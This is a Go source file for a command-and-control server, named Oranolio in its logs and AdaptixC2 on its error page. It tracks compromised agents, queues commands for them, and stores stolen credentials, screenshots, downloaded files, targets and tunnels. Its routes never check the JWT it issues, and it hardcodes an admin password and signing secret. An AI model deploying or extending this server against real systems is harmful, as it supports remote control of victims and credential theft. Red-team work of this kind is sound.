package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/golang-jwt/jwt/v5"
	"github.com/mattn/go-sqlite3"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

// Database models
type Agent struct {
	ID         string    `json:"id" gorm:"primaryKey"`
	Type       string    `json:"type"`
	ExternalIP string    `json:"external_ip"`
	InternalIP string    `json:"internal_ip"`
	Computer   string    `json:"computer"`
	User       string    `json:"user"`
	OS         string    `json:"os"`
	Process    string    `json:"process"`
	LastSeen   time.Time `json:"last_seen"`
	Status     string    `json:"status"`
}

type Listener struct {
	Name     string `json:"name" gorm:"primaryKey"`
	Type     string `json:"type"`
	Protocol string `json:"protocol"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Status   string `json:"status"`
}

type Task struct {
	ID        string    `json:"id" gorm:"primaryKey"`
	AgentID   string    `json:"agent_id"`
	Command   string    `json:"command"`
	Status    string    `json:"status"`
	Output    string    `json:"output"`
	CreatedAt time.Time `json:"created_at"`
}

type Download struct {
	ID       string `json:"id" gorm:"primaryKey"`
	Filename string `json:"filename"`
	Size     int64  `json:"size"`
	AgentID  string `json:"agent_id"`
	Status   string `json:"status"`
	Content  []byte `json:"-"`
}

type Screenshot struct {
	ID        string    `json:"id" gorm:"primaryKey"`
	AgentID   string    `json:"agent_id"`
	Content   []byte    `json:"content"`
	Timestamp time.Time `json:"timestamp"`
}

type Credential struct {
	ID       string `json:"id" gorm:"primaryKey"`
	Username string `json:"username"`
	Password string `json:"password"`
	Domain   string `json:"domain"`
	Type     string `json:"type"`
	Host     string `json:"host"`
}

type Target struct {
	ID      string `json:"id" gorm:"primaryKey"`
	Computer string `json:"computer"`
	Domain  string `json:"domain"`
	Address string `json:"address"`
	OS      string `json:"os"`
	Alive   bool   `json:"alive"`
}

type Tunnel struct {
	ID         string `json:"id" gorm:"primaryKey"`
	Type       string `json:"type"`
	LocalHost  string `json:"local_host"`
	LocalPort  int    `json:"local_port"`
	RemoteHost string `json:"remote_host"`
	RemotePort int    `json:"remote_port"`
	Status     string `json:"status"`
}

type ChatMessage struct {
	ID        string    `json:"id" gorm:"primaryKey"`
	Username  string    `json:"username"`
	Content   string    `json:"content"`
	Type      string    `json:"type"`
	Timestamp time.Time `json:"timestamp"`
}

// WebSocket upgrader
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// JWT secret
var jwtSecret = []byte("oranolio-secret-key-2024")

// Database
var db *gorm.DB

// WebSocket connections
var clients = make(map[*websocket.Conn]bool)

func main() {
	// Initialize database
	initDB()

	// Set Gin mode
	gin.SetMode(gin.ReleaseMode)

	// Create router
	r := gin.Default()

	// CORS middleware
	r.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization")
		
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		
		c.Next()
	})

	// API routes
	api := r.Group("/endpoint")
	{
		// Authentication
		api.POST("/login", loginHandler)
		api.POST("/refresh", refreshTokenHandler)
		
		// WebSocket channel
		api.GET("/channel", websocketHandler)
		
		// Agent management
		api.GET("/agents", getAgentsHandler)
		api.POST("/agents", createAgentHandler)
		api.DELETE("/agents/:id", deleteAgentHandler)
		api.POST("/agents/:id/command", executeCommandHandler)
		
		// Listener management
		api.GET("/listeners", getListenersHandler)
		api.POST("/listeners", createListenerHandler)
		api.DELETE("/listeners/:name", deleteListenerHandler)
		
		// Task management
		api.GET("/tasks", getTasksHandler)
		api.POST("/tasks", createTaskHandler)
		
		// Downloads
		api.GET("/downloads", getDownloadsHandler)
		api.GET("/downloads/:id", downloadFileHandler)
		
		// Screenshots
		api.GET("/screenshots", getScreenshotsHandler)
		
		// Credentials
		api.GET("/credentials", getCredentialsHandler)
		api.POST("/credentials", createCredentialHandler)
		
		// Targets
		api.GET("/targets", getTargetsHandler)
		api.POST("/targets", createTargetHandler)
		
		// Tunnels
		api.GET("/tunnels", getTunnelsHandler)
		api.POST("/tunnels", createTunnelHandler)
		
		// Chat
		api.GET("/chat", getChatMessagesHandler)
		api.POST("/chat", sendChatMessageHandler)
	}

	// Health check
	r.GET("/health", func(c *gin.Context) {
		c.JSON(200, gin.H{"status": "ok"})
	})

	// 404 handler
	r.NoRoute(func(c *gin.Context) {
		c.HTML(404, "text/html", `
			<!DOCTYPE html>
			<html>
			<head>
				<title>AdaptixC2 404</title>
				<style>
					body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
					h1 { color: #ff5722; }
				</style>
			</head>
			<body>
				<h1>AdaptixC2 404</h1>
				<p>Please enter correct connection details</p>
			</body>
			</html>
		`)
	})

	// Get port from environment
	port := os.Getenv("PORT")
	if port == "" {
		port = "4321"
	}

	// Start server
	log.Printf("Starting Oranolio C2 Server on port %s", port)
	log.Fatal(r.Run(":" + port))
}

func initDB() {
	var err error
	db, err = gorm.Open(sqlite.Open("oranolio.db"), &gorm.Config{})
	if err != nil {
		log.Fatal("Failed to connect to database:", err)
	}

	// Auto-migrate tables
	db.AutoMigrate(&Agent{}, &Listener{}, &Task{}, &Download{}, &Screenshot{}, &Credential{}, &Target{}, &Tunnel{}, &ChatMessage{})

	// Create default listener
	var count int64
	db.Model(&Listener{}).Count(&count)
	if count == 0 {
		db.Create(&Listener{
			Name:     "default-http",
			Type:     "beacon_http",
			Protocol: "http",
			Host:     "0.0.0.0",
			Port:     8080,
			Status:   "active",
		})
	}
}

func loginHandler(c *gin.Context) {
	var loginData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := c.ShouldBindJSON(&loginData); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}

	// Simple authentication (in production, use proper password hashing)
	if loginData.Username == "admin" && loginData.Password == "Oranolio2024!Secure" {
		token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
			"username": loginData.Username,
			"exp":      time.Now().Add(time.Hour * 24).Unix(),
		})

		tokenString, err := token.SignedString(jwtSecret)
		if err != nil {
			c.JSON(500, gin.H{"error": "Failed to generate token"})
			return
		}

		c.JSON(200, gin.H{
			"token": tokenString,
			"user":  loginData.Username,
		})
	} else {
		c.JSON(401, gin.H{"error": "Invalid credentials"})
	}
}

func refreshTokenHandler(c *gin.Context) {
	// Implement token refresh logic
	c.JSON(200, gin.H{"message": "Token refreshed"})
}

func websocketHandler(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("WebSocket upgrade error:", err)
		return
	}
	defer conn.Close()

	clients[conn] = true

	// Send initial data
	sendInitialData(conn)

	for {
		var msg map[string]interface{}
		err := conn.ReadJSON(&msg)
		if err != nil {
			log.Println("WebSocket read error:", err)
			delete(clients, conn)
			break
		}

		handleWebSocketMessage(conn, msg)
	}
}

func sendInitialData(conn *websocket.Conn) {
	// Send all data to the client
	var agents []Agent
	var listeners []Listener
	var tasks []Task
	var downloads []Download
	var screenshots []Screenshot
	var credentials []Credential
	var targets []Target
	var tunnels []Tunnel
	var chatMessages []ChatMessage

	db.Find(&agents)
	db.Find(&listeners)
	db.Find(&tasks)
	db.Find(&downloads)
	db.Find(&screenshots)
	db.Find(&credentials)
	db.Find(&targets)
	db.Find(&tunnels)
	db.Find(&chatMessages)

	data := map[string]interface{}{
		"type": "sync_data",
		"agents": agents,
		"listeners": listeners,
		"tasks": tasks,
		"downloads": downloads,
		"screenshots": screenshots,
		"credentials": credentials,
		"targets": targets,
		"tunnels": tunnels,
		"chat": chatMessages,
	}

	conn.WriteJSON(data)
}

func handleWebSocketMessage(conn *websocket.Conn, msg map[string]interface{}) {
	msgType := msg["type"].(string)

	switch msgType {
	case "auth":
		// Handle authentication
		conn.WriteJSON(map[string]interface{}{
			"type": "auth_success",
		})
	case "sync_request":
		sendInitialData(conn)
	case "chat_send":
		// Handle chat message
		content := msg["message"].(string)
		chatMsg := ChatMessage{
			ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
			Username:  "admin",
			Content:   content,
			Type:      "user",
			Timestamp: time.Now(),
		}
		db.Create(&chatMsg)
		
		// Broadcast to all clients
		broadcastMessage(map[string]interface{}{
			"type": "chat_message",
			"message": chatMsg,
		})
	}
}

func broadcastMessage(msg map[string]interface{}) {
	for conn := range clients {
		err := conn.WriteJSON(msg)
		if err != nil {
			log.Println("WebSocket write error:", err)
			delete(clients, conn)
		}
	}
}

// HTTP handlers
func getAgentsHandler(c *gin.Context) {
	var agents []Agent
	db.Find(&agents)
	c.JSON(200, agents)
}

func createAgentHandler(c *gin.Context) {
	var agent Agent
	if err := c.ShouldBindJSON(&agent); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	agent.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	agent.LastSeen = time.Now()
	agent.Status = "active"
	
	db.Create(&agent)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "agent_new",
		"agent": agent,
	})
	
	c.JSON(201, agent)
}

func deleteAgentHandler(c *gin.Context) {
	id := c.Param("id")
	db.Delete(&Agent{}, "id = ?", id)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "agent_remove",
		"agentId": id,
	})
	
	c.JSON(200, gin.H{"message": "Agent deleted"})
}

func executeCommandHandler(c *gin.Context) {
	id := c.Param("id")
	var cmdData struct {
		Command string `json:"command"`
	}
	
	if err := c.ShouldBindJSON(&cmdData); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	task := Task{
		ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
		AgentID:   id,
		Command:   cmdData.Command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	db.Create(&task)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "task_update",
		"task": task,
	})
	
	c.JSON(201, task)
}

func getListenersHandler(c *gin.Context) {
	var listeners []Listener
	db.Find(&listeners)
	c.JSON(200, listeners)
}

func createListenerHandler(c *gin.Context) {
	var listener Listener
	if err := c.ShouldBindJSON(&listener); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	listener.Status = "active"
	db.Create(&listener)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "listener_new",
		"listener": listener,
	})
	
	c.JSON(201, listener)
}

func deleteListenerHandler(c *gin.Context) {
	name := c.Param("name")
	db.Delete(&Listener{}, "name = ?", name)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "listener_remove",
		"listenerName": name,
	})
	
	c.JSON(200, gin.H{"message": "Listener deleted"})
}

func getTasksHandler(c *gin.Context) {
	var tasks []Task
	db.Find(&tasks)
	c.JSON(200, tasks)
}

func createTaskHandler(c *gin.Context) {
	var task Task
	if err := c.ShouldBindJSON(&task); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	task.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	task.CreatedAt = time.Now()
	task.Status = "pending"
	
	db.Create(&task)
	c.JSON(201, task)
}

func getDownloadsHandler(c *gin.Context) {
	var downloads []Download
	db.Find(&downloads)
	c.JSON(200, downloads)
}

func downloadFileHandler(c *gin.Context) {
	id := c.Param("id")
	var download Download
	if err := db.First(&download, "id = ?", id).Error; err != nil {
		c.JSON(404, gin.H{"error": "File not found"})
		return
	}
	
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", download.Filename))
	c.Data(200, "application/octet-stream", download.Content)
}

func getScreenshotsHandler(c *gin.Context) {
	var screenshots []Screenshot
	db.Find(&screenshots)
	c.JSON(200, screenshots)
}

func getCredentialsHandler(c *gin.Context) {
	var credentials []Credential
	db.Find(&credentials)
	c.JSON(200, credentials)
}

func createCredentialHandler(c *gin.Context) {
	var credential Credential
	if err := c.ShouldBindJSON(&credential); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	credential.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	db.Create(&credential)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "credential_new",
		"credential": credential,
	})
	
	c.JSON(201, credential)
}

func getTargetsHandler(c *gin.Context) {
	var targets []Target
	db.Find(&targets)
	c.JSON(200, targets)
}

func createTargetHandler(c *gin.Context) {
	var target Target
	if err := c.ShouldBindJSON(&target); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	target.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	db.Create(&target)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "target_new",
		"target": target,
	})
	
	c.JSON(201, target)
}

func getTunnelsHandler(c *gin.Context) {
	var tunnels []Tunnel
	db.Find(&tunnels)
	c.JSON(200, tunnels)
}

func createTunnelHandler(c *gin.Context) {
	var tunnel Tunnel
	if err := c.ShouldBindJSON(&tunnel); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	tunnel.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	tunnel.Status = "active"
	db.Create(&tunnel)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "tunnel_new",
		"tunnel": tunnel,
	})
	
	c.JSON(201, tunnel)
}

func getChatMessagesHandler(c *gin.Context) {
	var messages []ChatMessage
	db.Order("timestamp desc").Limit(100).Find(&messages)
	c.JSON(200, messages)
}

func sendChatMessageHandler(c *gin.Context) {
	var msgData struct {
		Content string `json:"content"`
	}
	
	if err := c.ShouldBindJSON(&msgData); err != nil {
		c.JSON(400, gin.H{"error": "Invalid request"})
		return
	}
	
	message := ChatMessage{
		ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
		Username:  "admin",
		Content:   msgData.Content,
		Type:      "user",
		Timestamp: time.Now(),
	}
	
	db.Create(&message)
	
	// Broadcast to WebSocket clients
	broadcastMessage(map[string]interface{}{
		"type": "chat_message",
		"message": message,
	})
	
	c.JSON(201, message)
}